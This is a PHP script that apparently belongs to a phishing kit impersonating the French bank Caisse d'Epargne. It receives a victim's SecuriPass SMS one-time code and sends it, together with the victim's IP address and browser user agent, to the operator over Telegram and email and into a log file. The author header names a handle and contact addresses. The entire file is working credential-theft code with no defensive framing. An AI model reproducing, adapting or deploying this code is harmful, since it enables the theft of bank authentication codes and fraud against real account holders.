<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/


error_reporting(0);
if(isset($_POST['securpasse'])){
if(!empty($_POST['securpasse'])){
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$sms = $_POST['securpasse'];
	$message = "\nSMS 2 : $sms\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - SecuriPass FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
	$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);
	  echo json_encode(['status'=>'success']);
	
}else{
	
	header('Location: ../securepass.php');
}	
	
	
}else{
	header('Location: ../index.html');
}
?>